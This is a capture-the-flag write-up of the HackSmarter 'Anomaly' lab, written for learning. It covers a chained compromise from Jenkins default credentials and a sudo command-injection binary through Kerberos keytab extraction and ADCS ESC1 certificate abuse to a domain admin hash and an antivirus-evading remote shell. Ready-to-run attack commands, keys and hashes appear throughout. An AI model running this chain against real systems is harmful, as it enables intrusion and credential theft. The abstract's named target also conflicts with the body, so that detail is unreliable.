# [HackSmarter.org - Anomaly](https://www.hacksmarter.org/courses/336f34fa-2097-4b41-9e05-16698e68dcea/take)

![d0842406abd401e3aec1d962814bc8b4.png](/resources/d0842406abd401e3aec1d962814bc8b4.png)

## Table of Contents

- [Abstract](#abstract)
- [Scope and Objective](#scope-and-objective)
- [Enumeration](#enumeration)
- [Initial Access to Ubuntu Server via Jenkin](#initial-access-to-ubuntu-server-via-jenkin)
- [Becoming root on Ubuntu Server with SUDO](#becoming-root-on-ubuntu-server-with-sudo)
- [Discovery of kerberos keytab file on Ubuntu Server](#discovery-of-kerberos-keytab-file-on-ubuntu-server)
- [Enumerate Domain Controller](#enumerate-domain-controller)
- [Privilege Escalation via ADCS ESC1 from Domain Computers](#privilege-escalation-via-adcs-esc1-from-domain-computers)

***
## Abstract 
Anomaly is a chained lab with Ubuntu Server and Windows Active Directory combined. we start off with the discovery is running on Ubuntu server and can be logged in with "admin:admin" credential, then we can archive foothold on the Ubuntu server by create a new job to execute shell command.

After gaining foothold on Ubuntu server, we compromised "jenkins" user which can execute custom binary via SUDO as root without needing a password, the custom binary will pass an argument to `system()` function without any check so we can leverage it to become root on the Ubuntu server.

After becoming root, we can now download the kerberos keytab file and extract AES key of "Brandon_Boyd" which is a valid domain user where we can start off our domain enumeration after obtaining kerberos ticket of this user and discover the password of this user on the description

By using bloodhound, we discover that account in domain computers group can enroll "CertAdmin" certificate which is vulnerable to ADCS ESC1 which we can then create a new computer account and leverage it to obtain NT hash of "the_emperor" user, the domain admins of the domain and compromise the domain.

## Scope and Objective
**Objective**
The core objective is to demonstrate the full impact of a successful network intrusion by achieving Domain Administrator privileges over the client's Active Directory environment. The test will simulate a motivated external attacker's progression from an initial foothold to complete administrative control.

**Scope**
The in-scope assets for this engagement include two critical IP addresses:
1. A hardened **Ubuntu Server** (Initial Foothold Target).
2. The primary **Domain Controller** (Final Privilege Escalation Target).

It is a critical finding that the Domain Controller is running active Antivirus (AV) software; therefore, this test will specifically involve techniques to bypass or evade the installed AV to successfully compromise the domain and demonstrate the potential for a full domain compromise.

## Enumeration

I will start with rustscan to NORTHJMP01 host first since it is faster than nmap and VPN connection can tolerate this much of traffic unlike HTB. (I could not use rustscan could not be used on HTB) and we can see that there are only 2 ports opened on the Ubuntu server which are SSH and website running on 8080

```
rustscan -a Anomaly-Web -- -A
```
![a08b92b794aa853723ffbaa15420db54.png](/resources/a08b92b794aa853723ffbaa15420db54.png)
![f9a64b87973c88bbb2d8600e73aa1fbd.png](/resources/f9a64b87973c88bbb2d8600e73aa1fbd.png)

I run rustscan on the domain controller next which reveals a lot of ports as expected of the domain controller 

```
rustscan -a Anomaly-DC -- -A
```
![2f02a27e31283a007dbfe47078bc6cd6.png](/resources/2f02a27e31283a007dbfe47078bc6cd6.png)

From the certificate of each service display the issuer as "anomaly-ANOMALY-DC-CA-2" indicates that Certificate service in running on the domain controller and we can also add "Anomaly-DC.anomaly.hsm" and "anomaly.hsm" to hosts file

![5d8d12f333d8b51742059e805f94d292.png](/resources/5d8d12f333d8b51742059e805f94d292.png)

Upon visiting website running on port 8080, we can see that Jenkins is running on this server

![25c813a6c867d7e3ffd56833712f756a.png](/resources/25c813a6c867d7e3ffd56833712f756a.png)

By simply guessing password, I finally logged in to Jenkins using "admin:admin" 

![f0f82cd8ca07ba5615193a948b77b4ff.png](/resources/f0f82cd8ca07ba5615193a948b77b4ff.png)

## Initial Access to Ubuntu Server via Jenkin

To obtain a shell on Ubuntu server, we can create a new job and then add "Execute shell" in the "Build Steps" section

![403d1a13bf2fa1d32a9f31fddfb43b8e.png](/resources/403d1a13bf2fa1d32a9f31fddfb43b8e.png)
![0d76d670e96ca395f4f5d6afdb3049a4.png](/resources/0d76d670e96ca395f4f5d6afdb3049a4.png)

I will simply use busybox and netcat to connect back to my machine on port 4444 which is the default port of penelope

![0ba5dab27d87c9592a40ec7c4c8aacea.png](/resources/0ba5dab27d87c9592a40ec7c4c8aacea.png)

After creating a new job, I will run penelope to wait for the reverse shell

```
penelope
```

Now we can click "Build Now" to let reverse shell command run and in a few seconds, we should have a shell as "jenkins" user on penelope

![b8ab8b8b091a9c99d92f8ab021ad1bbd.png](/resources/b8ab8b8b091a9c99d92f8ab021ad1bbd.png)
![f83440a01598b14ef0e091d22d0af117.png](/resources/f83440a01598b14ef0e091d22d0af117.png)

## Becoming root on Ubuntu Server with SUDO

After footholding on the Ubuntu server, we can simply run `sudo -l` command to check for the lowest hangind fruit to see if we can run any binary/command as any user via SUDO and we can see that "jenkins" user can execute `/usr/bin/router_config` as root without a password via SUDO 

![a9a93a28ee54b0c8bfea9f2116202db8.png](/resources/a9a93a28ee54b0c8bfea9f2116202db8.png)

The binary is a custom one so we will need to find out what it will do so I press F12 to detach session and download the binary to my machine

![024b71e12e68b10767af6849a9dbb077.png](/resources/024b71e12e68b10767af6849a9dbb077.png)

By simply run `ltrace` on the binary, it will print a simple banner and it expect 1 argument

![23a61f998bba0fe2cacca4f0b1893171.png](/resources/23a61f998bba0fe2cacca4f0b1893171.png)

So by supplying "anything" as argument, we can see that it will just pass it to `system()` without any check which mean it is vulnerable to command injection 

![4330df24d845f3652f908ff3151bb0a9.png](/resources/4330df24d845f3652f908ff3151bb0a9.png)

We could discover this by doing statis analysis of this binary as well, since the binary is very small then [dogbolt](https://dogbolt.org/) will do just fine

![6b209d67440ba4417dcc30d68439ea99.png](/resources/6b209d67440ba4417dcc30d68439ea99.png)

Now if we just run it with simple command like `id`, we can indeed see it execute

![904aafb789db9a7c1e9543aa74b97883.png](/resources/904aafb789db9a7c1e9543aa74b97883.png)

Going back to Ubuntu server, we can use it to spawn a bash shell as root

```
sudo /usr/bin/router_config "/bin/bash -p"
```
![9fc7e14633af09a6006b969c28fd8a12.png](/resources/9fc7e14633af09a6006b969c28fd8a12.png)

## Discovery of kerberos keytab file on Ubuntu Server

Penelope have a nice feature where we can run linpeas on the current session without manually downloading them by ourselves, we can simply press F12 to detach session and run the following command

```
run peass_ng
```
![a51c8c9490445921b02fd7d5489c3d00.png](/resources/a51c8c9490445921b02fd7d5489c3d00.png)

The linpeas result shows kerberos configuration file and also keytab file for `Brandon_Boyd@ANOMALY.HSM` user

![f9dd8a3042f2bcdee51998086e5fe120.png](/resources/f9dd8a3042f2bcdee51998086e5fe120.png)

Now we can download this file into our machine and use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract/tree/master) to extract AES key from this file 

```
download /etc/krb5.keytab
python keytabextract.py ~/Desktop/hacksmarter/anon/krb5.keytab
```
![cf7654c13d070c10383de0327dc4671b.png](/resources/cf7654c13d070c10383de0327dc4671b.png)

With aes key, we can now request TGT of this user 

```
impacket-getTGT anomaly.hsm/Brandon_Boyd -aesKey f9754c5288b844eb86054695b2c12b93716f57c41d26325c1a994e12bbbeff52
```
![6abac3bbee80b40f455b9ead084377a2.png](/resources/6abac3bbee80b40f455b9ead084377a2.png)

## Enumerate Domain Controller

With TGT, we can now enumerate the domain controller as "Brandon_Boyd" user and we can see that there is no non-standard share on the domain controller machine

```
export KRB5CCNAME=Brandon_Boyd.ccache
uv run nxc smb Anomaly-DC.anomaly.hsm -k --use-kcache --shares
```
![9faba00b7c29eb74f20cb1b32eac0a6c.png](/resources/9faba00b7c29eb74f20cb1b32eac0a6c.png)

I will pull a valid domain user list to a new text file first so if I obtained a new hash or a password then I can only spray on the valid domain user which we can see the password of "Brandon_Boyd" user from his description ("3edc4rfv#EDC$RFV").

```
uv run nxc ldap Anomaly-DC.anomaly.hsm -k --use-kcache --users-export user.txt
```
![98797b9e430832b1e89df82e2fb81643.png](/resources/98797b9e430832b1e89df82e2fb81643.png)

I can use the username and password to run rusthound but I went with kerberos authentication method with will need to properly put the correct realm in our kerberos configuration file to be able to use this ticket to run rusthound

![20f6e2f32bc420f48611f83c093dec50.png](/resources/20f6e2f32bc420f48611f83c093dec50.png)

Kerberos configuration file can be easily created via NetExec with `--generate-krb5-file` flag

```
uv run nxc smb Anomaly-DC.anomaly.hsm -k --use-kcache --generate-krb5-file krb5conf2
```
![c94821f38a04b82f0d6d1651c02d10e8.png](/resources/c94821f38a04b82f0d6d1651c02d10e8.png)

I will set this newly created file as the new kerberos configuration 

```
export KRB5_CONFIG=krb5conf2
```
![ff5565125967092412e4c0aa16c055fc.png](/resources/ff5565125967092412e4c0aa16c055fc.png)

Now I should be able to use rusthound with kerberos ticket to collect domain information. I went with this way just to learn that we can use kerberos ticket with rusthound

```
rusthound-ce -d anomaly.hsm -k -no-pass -f ANOMALY-DC.anomaly.hsm
```
![efa160ad9973156af95f254ca25cfed3.png](/resources/efa160ad9973156af95f254ca25cfed3.png)

I forgot to specify `-z` for zip file so I will manually create a zip file and upload it to bloodhound

![97d8e48db0f1e374727085547699c0cc.png](/resources/97d8e48db0f1e374727085547699c0cc.png)

## Privilege Escalation via ADCS ESC1 from Domain Computers

By using query related to ESC1, I discover that any domain computers who is a member of "Domain Computers" group have "GenericAll" right on "CertAdmin" certificate template and as we remember from the rusthound console that we have machine account quota = 10, and that's mean we can create up to 10 computers and all of them have ADCS ESC4 and ADCS ESC1 over this certificate template

![8e1c3a5b4670f52e6f73072c8ed28eb4.png](/resources/8e1c3a5b4670f52e6f73072c8ed28eb4.png)

Addionally, I also look for high valued target which are the member of domain admins group and I will target "anna_molly" user instead of Administrator user

![087ece5465c7209549e0b3b434e45d98.png](/resources/087ece5465c7209549e0b3b434e45d98.png)

First, I will create a new machine account with bloodyAD

```
bloodyAD --host Anomaly-DC -d anomaly.hsm -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' add computer 'backup' 'password123'
```
![405e91f6c107dfd48307877c8d362e01.png](/resources/405e91f6c107dfd48307877c8d362e01.png)

Next, I will use this newly created domain computer account to check if this account really has both ADCS ESC1 and ESC4 over "CertAdmin" template and turn out it has!

```
certipy-ad find -u 'backup$@anomaly.hsm' -p 'password123' -stdout -vulnerable 
```
![3efb4e7c6371360e9bb2af17e0651382.png](/resources/3efb4e7c6371360e9bb2af17e0651382.png)

To make ADCS ESC1 successfully done without any error, I will also lookup for SID of "anna_molly" to map with it samaccountname as well

![68921b78ad3b20968535fc68dbb86ad9.png](/resources/68921b78ad3b20968535fc68dbb86ad9.png)

Then I will request a certificate and specify upn of "anna_molly" user in SAN, and by having SID supplied, we can reduce the risk of mapping error as well. which we can see that we successfully requested certificate of "anna_molly" user.

```
certipy req -u 'backup$@anomaly.hsm' -p 'password123' -target 'anomaly.hsm' -dc-ip $IP -ca 'anomaly-ANOMALY-DC-CA-2' -template 'CertAdmin' -upn 'anna_molly@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105'
```
![6de69a22ab79cfd064c5f5b781836e19.png](/resources/6de69a22ab79cfd064c5f5b781836e19.png)

Using the certificate we just obtained, we can now use that to authenticate to the domain controller again to get TGT which certipy will automatically retrieve NT hash for us.

```
certipy auth -pfx anna_molly.pfx -dc-ip $IP
```
![a9149a272db51d8a20e531d8cc183655.png](/resources/a9149a272db51d8a20e531d8cc183655.png)

We can now confirm that this user have administive privilege on this domain controller

```
uv run nxc smb Anomaly-DC.anomaly.hsm -u anna_molly -H be4bf3131851aee9a424c58e02879f6e
```
![1241513586e0cf7209b1fe1997473547.png](/resources/1241513586e0cf7209b1fe1997473547.png)

Since AV is running on the domain controller, I will use [wmiexec2](https://github.com/ice-wzl/wmiexec2) which is stealthy upgrade of wmiexec to evade signature-based AV detection to run command on the machine as local admin and now we can loot root flag located on the desktop of administrator user

```
python wmiexec2.py anomaly.hsm/anna_molly@ANOMALY-DC -hashes :be4bf3131851aee9a424c58e02879f6e
```
![54d173419205e3282c88ca99ee053661.png](/resources/54d173419205e3282c88ca99ee053661.png)

And we are done :D

***
